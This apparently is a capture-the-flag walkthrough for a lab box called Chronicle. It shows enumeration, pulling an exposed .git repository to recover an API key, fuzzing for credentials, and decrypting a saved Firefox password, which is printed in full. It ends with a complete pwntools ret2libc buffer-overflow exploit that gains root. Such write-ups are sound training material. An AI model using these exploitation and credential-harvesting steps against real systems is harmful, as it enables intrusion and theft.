<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Chronical</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>Chronical</u></b></h1><br />Starting off with nmap<br /><br />nmap -v -sV -sC -oA nmap chronicle.thm<br /><br /><br />22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 b2:4c:49:da:7c:9a:3a:ba:6e:59:46:c2:a9:e6:a2:35 (RSA)<br />|   256 7a:3e:30:70:cf:32:a4:f2:0a:cb:2b:42:08:0c:19:bd (ECDSA)<br />|_  256 4f:35:e1:33:96:84:5d:e5:b3:75:7d:d8:32:18:e0:a8 (ED25519)<br />80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))<br />| http-methods: <br />|_  Supported Methods: OPTIONS HEAD GET POST<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br />|_http-title: Site doesn't have a title (text/html).<br />8081/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)<br />| http-methods: <br />|_  Supported Methods: OPTIONS GET HEAD<br />|_http-server-header: Werkzeug/1.0.1 Python/3.6.9<br />|_http-title: Site doesn't have a title (text/html; charset=utf-8).<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br /><br />Looks like just http runnin on 80 and 8081 with ssh on 22<br /><br />Enumeration on <a href="http://chronicle.thm:8081">http://chronicle.thm:8081</a> I found a login page then a /forget page which led me to this<br /><br /><br /><img src="images/101-1.png" alt="images/101-1.png" /><br /><br /><br />Using burp to intecept the POST request we get this<br /><br /><br /><img src="images/101-2.png" alt="images/101-2.png" /><br /><br /><br />Looks like were missing the api key. Also looking through the source code I found /static/js/forget.js which points out this<br /><br /><br /><img src="images/101-3.png" alt="images/101-3.png" /><br /><br /><br />So it seems that having no api key stops the funitionality. So lets find that key!<br /><br />Lets go back to gobuster on port 80<br /><br />gobuster dir -u chronicle.thm -w /usr/share/wordlists/dirb/common.txt -t 20 -x php,html,bak,txt,db,zip<br /><br /><br /><img src="images/101-4.png" alt="images/101-4.png" /><br /><br /><br />/old lookings intresting, lets run another gobuster on it<br /><br />ffuf -u <a href="http://chronicle.thm/old/FUZZ">http://chronicle.thm/old/FUZZ</a> -w raft-large-directories-lowercase.txt<br /><br />Cool! we got a .git repository, lets grab it<br /><br />wget --recursive <a href="http://chronicle.thm/old/.git">http://chronicle.thm/old/.git</a> --continue<br /><br />First thing I did was check the git log<br /><br />git log<br /><br /><br /><img src="images/101-5.png" alt="images/101-5.png" /><br /><br /><br />Cool we got some commit hashes, lets check them out<br /><br />git show cd0375717551c8c8287a53b78b014b7d7e4da3bb<br /><br /><br /><img src="images/101-6.png" alt="images/101-6.png" /><br /><br /><br />Cool we got a api key, lets use it!<br /><br />Lets now send the intecepted POST request to repeater and see what we get<br /><br /><br /><img src="images/101-7.png" alt="images/101-7.png" /><br /><br /><br />Okay cool it work but seems like we dont have the right username. After trying usernames and words I found around nothing would work so I decided to brute force it!<br /><br />ffuf -w /opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt -X POST -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}' -u <a href="http://chronicle.thm:8081/api/FUZZ">http://chronicle.thm:8081/api/FUZZ</a> -fw 2<br /><br /><br /><img src="images/101-8.png" alt="images/101-8.png" /><br /><br /><br />We get a hit, lets check it out<br /><br /><br /><img src="images/101-9.png" alt="images/101-9.png" /><br /><br /><br />Awecome we got some creds, lets try it on ssh!<br /><br /><br /><img src="images/101-10.png" alt="images/101-10.png" /><br /><br /><br />Cool we got user! now lets go after root<br /><br />Okay so after running linpeas.sh I didn't really find anything intresting so I starting looking in common places when I found .mozilla in carlJ's home dir. cd'ing into it we see there is firefox within it, wonder if we can use a firefox dycrypter to dump some username and passwords.<br /><br /><br /><img src="images/101-11.png" alt="images/101-11.png" /><br /><br /><br />The script ill be using is firefox_decrypt.py <br /><a href="https://github.com/unode/firefox_decrypt">https://github.com/unode/firefox_decrypt</a><br /><br />First set up a http server on attacking host<br /><br />python3 -m http.server<br /><br />Then bring over the release file<br /><br />wget --recursive chronicle.thm:8000/0ryxwn4c.default-release --continue<br /><br />python3 /home/kali/THM/Chronicle/firefox_decrypt/firefox_decrypt.py 0ryxwn4c.default-release<br /><br /><br /><img src="images/101-12.png" alt="images/101-12.png" /><br /><br /><br />I got promted with a password, I did basic passwords till funny enough password1 worked<br /><br /><br /><img src="images/101-13.png" alt="images/101-13.png" /><br /><br /><br />Cool we got a password<br />carlj : Pas$w0RD59247<br /><br />Lets use to ssh in!<br /><br /><br /><img src="images/101-14.png" alt="images/101-14.png" /><br /><br /><br />Once ssh in I went into Mailing and found this<br /><br /><br /><img src="images/101-15.png" alt="images/101-15.png" /><br /><br /><br />seems to be some sort of script so ran it to see what it was<br /><br /><br /><img src="images/101-16.png" alt="images/101-16.png" /><br /><br /><br />looks like we input some test and then it ends, the instresting part about this script is “limit 80”. I tried to see if I could break this by putting more than 80 characters to see if we get an error or not.<br /><br /><br /><img src="images/101-17.png" alt="images/101-17.png" /><br /><br /><br />Cool we got a Sgmentation fault meaning this is most likley exposed to a buffer overflow<br />Lets get some info to create a expoit script to overlow it<br /><br />ldd smail<br /><br /><br /><img src="images/101-18.png" alt="images/101-18.png" /><br /><br /><br />The base address of libc is 0x00007ffff79e2000<br /><br />strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh<br /><br /><br /><img src="images/101-19.png" alt="images/101-19.png" /><br /><br /><br />base is 1b3e1a<br /><br />readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system<br /><br /><br /><img src="images/101-20.png" alt="images/101-20.png" /><br /><br /><br />The offset of system from the libc base is 0x4f550<br /><br />ROPgadget --binary smail | grep rdi<br /><br /><br /><img src="images/101-21.png" alt="images/101-21.png" /><br /><br /><br />objdump -d smail | grep ret<br /><br /><br /><img src="images/101-22.png" alt="images/101-22.png" /><br /><br /><br />Here the ret address is 400556<br /><br />Exploit:<br /><div class="codebox"><div class="codebox">from&nbsp;pwn&nbsp;import&nbsp;*<br /><br />p&nbsp;=&nbsp;process('./smail')<br /><br />base&nbsp;=&nbsp;0x7ffff79e2000<br />sys&nbsp;=&nbsp;base&nbsp;+&nbsp;0x4f550<br />binsh&nbsp;=&nbsp;base&nbsp;+&nbsp;0x1b3e1a<br /><br />rop_rdi&nbsp;=&nbsp;0x4007f3<br /><br />payload&nbsp;=&nbsp;b'A'&nbsp;*&nbsp;72<br />payload&nbsp;+=&nbsp;p64(0x400556)<br />payload&nbsp;+=&nbsp;p64(rop_rdi)<br />payload&nbsp;+=&nbsp;p64(binsh)<br />payload&nbsp;+=&nbsp;p64(sys)<br />payload&nbsp;+=&nbsp;p64(0x0)<br /><br /><br />p.clean()<br />p.sendline("2")<br />p.sendline(payload)<br />p.interactive()<br /><br /><br /></div></div><br /><br /><br /><img src="images/101-23.png" alt="images/101-23.png" /><br /><br /><br />And just like that we got root!<br /><br /><br /><br /><br /><br /></body></html>